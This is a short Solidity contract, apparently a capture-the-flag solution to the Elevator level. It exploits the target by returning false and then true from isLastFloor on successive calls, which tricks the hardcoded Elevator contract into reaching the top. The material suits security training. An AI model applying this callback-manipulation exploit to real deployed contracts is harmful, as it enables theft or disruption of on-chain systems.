// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Elevator.sol";

contract MySolution is Building {
  Elevator immutable myElevator = Elevator(payable(0x24B3c7704709ed1491473F30393FFc93cFB0FC34));
  bool private _entered = false;

  constructor() payable {}
  function run() external {
    myElevator.goTo(10);
  }
  function isLastFloor(uint256) external returns (bool) {
    if (!_entered) {
      _entered = true;
      return false;
    } else {
      return true;
    }
  }
}